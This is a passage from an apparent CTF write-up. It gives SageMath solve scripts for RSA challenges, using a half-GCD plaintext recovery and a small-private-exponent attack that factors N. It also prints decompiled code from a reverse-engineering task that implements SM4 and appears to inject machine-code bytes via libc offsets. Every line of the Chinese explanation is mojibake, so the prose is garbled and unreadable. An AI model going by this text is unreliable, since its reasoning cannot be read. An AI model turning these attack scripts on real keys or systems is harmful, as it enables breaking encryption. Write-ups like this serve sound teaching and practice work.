</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>R10</span> <span class=o>*</span> <span class=n>a</span> <span class=o>+</span> <span class=n>R11</span> <span class=o>*</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span><span class=p>,</span> <span class=n>e</span> <span class=o>=</span> <span class=n>c</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>d_top</span><span class=p>,</span> <span class=n>d_bot</span> <span class=o>=</span> <span class=n>d</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=p>(</span><span class=n>m</span> <span class=o>//</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>e_top</span><span class=p>,</span> <span class=n>e_bot</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=p>(</span><span class=n>m</span> <span class=o>//</span> <span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>S00</span><span class=p>,</span> <span class=n>S01</span><span class=p>,</span> <span class=n>S10</span><span class=p>,</span> <span class=n>S11</span> <span class=o>=</span> <span class=n>HGCD</span><span class=p>(</span><span class=n>d_top</span><span class=p>,</span> <span class=n>e_top</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>RET00</span> <span class=o>=</span> <span class=n>S01</span> <span class=o>*</span> <span class=n>R00</span> <span class=o>+</span> <span class=p>(</span><span class=n>S00</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>S01</span><span class=p>)</span> <span class=o>*</span> <span class=n>R10</span>
</span></span><span class=line><span class=cl>    <span class=n>RET01</span> <span class=o>=</span> <span class=n>S01</span> <span class=o>*</span> <span class=n>R01</span> <span class=o>+</span> <span class=p>(</span><span class=n>S00</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>S01</span><span class=p>)</span> <span class=o>*</span> <span class=n>R11</span>
</span></span><span class=line><span class=cl>    <span class=n>RET10</span> <span class=o>=</span> <span class=n>S11</span> <span class=o>*</span> <span class=n>R00</span> <span class=o>+</span> <span class=p>(</span><span class=n>S10</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>S11</span><span class=p>)</span> <span class=o>*</span> <span class=n>R10</span>
</span></span><span class=line><span class=cl>    <span class=n>RET11</span> <span class=o>=</span> <span class=n>S11</span> <span class=o>*</span> <span class=n>R01</span> <span class=o>+</span> <span class=p>(</span><span class=n>S10</span> <span class=o>-</span> <span class=n>q</span> <span class=o>*</span> <span class=n>S11</span><span class=p>)</span> <span class=o>*</span> <span class=n>R11</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>RET00</span><span class=p>,</span> <span class=n>RET01</span><span class=p>,</span> <span class=n>RET10</span><span class=p>,</span> <span class=n>RET11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GCD</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=n>a</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=n>R00</span><span class=p>,</span> <span class=n>R01</span><span class=p>,</span> <span class=n>R10</span><span class=p>,</span> <span class=n>R11</span> <span class=o>=</span> <span class=n>HGCD</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>R00</span> <span class=o>*</span> <span class=n>a</span> <span class=o>+</span> <span class=n>R01</span> <span class=o>*</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>R10</span> <span class=o>*</span> <span class=n>a</span> <span class=o>+</span> <span class=n>R11</span> <span class=o>*</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>d</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>c</span><span class=o>.</span><span class=n>monic</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=n>c</span><span class=o>.</span><span class=n>quo_rem</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>d</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>GCD</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>PR</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>N</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f1</span> <span class=o>=</span> <span class=n>x</span><span class=o>^</span><span class=n>e</span> <span class=o>-</span> <span class=n>c1</span>
</span></span><span class=line><span class=cl><span class=n>f2</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span><span class=o>*</span><span class=n>x</span> <span class=o>+</span> <span class=n>x2</span><span class=p>)</span><span class=o>^</span><span class=n>e</span> <span class=o>-</span> <span class=n>c2</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>f1</span><span class=p>,</span><span class=n>f2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=o>-</span><span class=n>res</span><span class=o>.</span><span class=n>monic</span><span class=p>()</span><span class=o>.</span><span class=n>coefficients</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>m</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=strange-rsa>Strange RSA</h2><p>é¦–å…ˆå‘ç°u,vè¾ƒå°ï¼Œå¯¼è‡´hintå‡½æ•°é‡Œé¢çš„d1ï¼Œd2æ˜¯å°ç§é’¥ï¼Œç”¨bonehè„šæœ¬å¯ä»¥è§£å‡ºd1ï¼Œd2è¿›ä¸€æ­¥è§£å‡ºuï¼Œv</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>d1</span> <span class=o>=</span> <span class=mi>1649010712229782299850848551980277578291258538000633837589698050054193337459137087</span>
</span></span><span class=line><span class=cl><span class=n>d2</span> <span class=o>=</span> <span class=mi>1285707407708336469611922789424965876916577005852352154890635610024931952186455505</span>
</span></span><span class=line><span class=cl><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>ZZ</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>hint_ct</span><span class=p>,</span><span class=n>d2</span><span class=p>,</span><span class=n>N2</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>v2</span> <span class=o>=</span> <span class=n>d1</span> <span class=o>//</span> <span class=n>gcd</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span><span class=n>d2</span><span class=p>)</span> <span class=o>+</span> <span class=n>d2</span> <span class=o>//</span> <span class=n>gcd</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span><span class=n>d2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=n>v2</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>u2</span> <span class=o>=</span> <span class=n>d1</span> <span class=o>//</span> <span class=n>gcd</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span><span class=n>d2</span><span class=p>)</span> <span class=o>-</span> <span class=n>d2</span> <span class=o>//</span> <span class=n>gcd</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span><span class=n>d2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>=</span> <span class=n>u2</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>v</span><span class=p>,</span><span class=n>u</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mi>21576</span><span class=p>,</span> <span class=mi>2671</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è§‚å¯Ÿeçš„ç”Ÿæˆï¼Œæœ‰ç­‰å¼</p><p>$$\frac{eu}{v} = \frac{w}{v} + A$$</p><p>$$e \cdot u = w + A \cdot v$$</p><p>å…¶ä¸­e,u,vå·²çŸ¥ï¼ŒAä¸º2048bitsï¼Œwä¸º538bits</p><p>è¿›ä¸€æ­¥å˜å½¢</p><p>$$\text A = N^4 - s^4 + 4Ns^2 - 2N^2 + 1, ; s = p + q$$</p><p>è€ƒè™‘è¿‘ä¼¼æ±‚å‡ºsï¼Œç„¶åfactor Nï¼Œå®é™…å‘ç°æ±‚å‡ºçš„s+1ç­‰äºp+q</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>u</span><span class=o>*</span><span class=n>e3</span> <span class=o>//</span> <span class=n>v</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>var</span><span class=p>(</span><span class=s2>&#34;s&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>N1</span><span class=o>^</span><span class=mi>4</span> <span class=o>-</span> <span class=n>s</span><span class=o>^</span><span class=mi>4</span> <span class=o>+</span> <span class=mi>4</span><span class=o>*</span><span class=n>N1</span><span class=o>*</span><span class=n>s</span><span class=o>^</span><span class=mi>2</span> <span class=o>-</span> <span class=mi>2</span><span class=o>*</span><span class=n>N1</span><span class=o>^</span><span class=mi>2</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>-</span> <span class=n>r</span>
</span></span><span class=line><span class=cl><span class=n>p_q</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>roots</span><span class=p>()[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=n>var</span><span class=p>(</span><span class=s2>&#34;x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>x</span><span class=o>*</span><span class=p>(</span><span class=n>p_q</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span> <span class=o>-</span> <span class=n>N1</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>roots</span><span class=p>()[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>N1</span><span class=o>//</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span> <span class=o>==</span> <span class=n>N1</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>e3</span><span class=p>,(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>ZZ</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>flag_ct</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>N1</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=reverse>Reverse</h1><h2 id=xuans>xuans</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_403A52</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=o>*</span><span class=n>a2</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=n>a2</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=n>a2</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=n>a2</span><span class=p>[</span><span class=mi>11</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=n>a2</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=n>a2</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>^</span> <span class=mh>0xA3B1BAC6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>v6</span> <span class=o>^</span> <span class=mh>0x56AA3350</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>v7</span> <span class=o>^</span> <span class=mh>0x677D9197</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>v8</span> <span class=o>^</span> <span class=mh>0xB27022DC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v8</span> <span class=o>^</span> <span class=mh>0xB27022DC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>v9</span> <span class=o>&lt;=</span> <span class=mh>0x1F</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>v4</span><span class=p>[</span><span class=n>v9</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>v4</span><span class=p>[</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>v3</span> <span class=o>^</span> <span class=n>sub_40393B</span><span class=p>(</span><span class=n>LODWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>[</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>3</span><span class=p>])</span> <span class=o>^</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=n>LODWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>[</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>2</span><span class=p>])</span> <span class=o>^</span> <span class=n>LODWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>[</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]))</span> <span class=o>^</span> <span class=n>dword_4AA280</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>v9</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>v4</span><span class=p>[</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=mi>8</span> <span class=o>*</span> <span class=n>v9</span><span class=o>++</span> <span class=o>+</span> <span class=n>a1</span><span class=p>)</span> <span class=o>=</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä»ä¸Šé¢çš„è½®åŠ å¯†å¾ˆå®¹æ˜“çœ‹å‡ºæ¥å¯¹äºflagçš„åŠ å¯†é€»è¾‘æ˜¯SM4ï¼Œå‰é¢å¯¹SM4çš„keyè¿›è¡Œäº†ä¸€ç³»åˆ—çš„æ“ä½œï¼Œå¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=nx>v45</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_436CA0</span><span class=p>(</span><span class=mi>500</span><span class=nx>LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v27</span> <span class=o>=</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xE87D8948E5894855</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xEB0000000FFC45C7</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x48D06348FC458B3A</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xB60FD00148E8458B</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x8D489848FC458B30</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x148E8458B48FF50</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x48FC458B08B60FD0</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x148E8458B48D063</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v28</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x831088F289CE31D0</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v29</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x7F00FC7D8301FC6D</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=nx>_QWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kr>char</span> <span class=o>*</span><span class=p>)</span><span class=nx>v29</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>=</span> <span class=mh>0xC35D9090C07F</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v44</span> <span class=o>=</span> <span class=nx>v45</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_436B50</span><span class=p>(</span><span class=mi>16</span><span class=nx>LL</span><span class=p>,</span> <span class=nx>v45</span><span class=p>,</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>,</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>,</span> <span class=nx>v2</span><span class=p>,</span> <span class=nx>v3</span><span class=p>,</span> <span class=nx>a2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_435AC0</span><span class=p>(</span><span class=mi>0</span><span class=nx>LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v43</span> <span class=o>=</span> <span class=nx>sub_402839</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=p>(</span><span class=kr>char</span><span class=p>)</span><span class=s2>&#34;libc.so&#34;</span><span class=p>,</span> <span class=nx>v4</span><span class=p>,</span> <span class=nx>v5</span><span class=p>,</span> <span class=nx>v6</span><span class=p>,</span> <span class=nx>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v42</span> <span class=o>=</span> <span class=nx>sub_402839</span><span class=p>(</span><span class=nx>v45</span><span class=p>,</span> <span class=p>(</span><span class=kr>char</span><span class=p>)</span><span class=s2>&#34;libc.so&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=s2>&#34;libc.so&#34;</span><span class=p>,</span> <span class=nx>v8</span><span class=p>,</span> <span class=nx>v9</span><span class=p>,</span> <span class=nx>v10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v41</span> <span class=o>=</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>sub_436A40</span> <span class=o>+</span> <span class=nx>v42</span> <span class=o>-</span> <span class=nx>v43</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v40</span> <span class=o>=</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>sub_420E20</span> <span class=o>+</span> <span class=nx>v42</span> <span class=o>-</span> <span class=nx>v43</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v25</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v25</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x4000</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v25</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>7</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v25</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>34</span><span class=nx>LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v26</span> <span class=o>=</span> <span class=mi>0</span><span class=nx>uLL</span><span class=p>;</span>
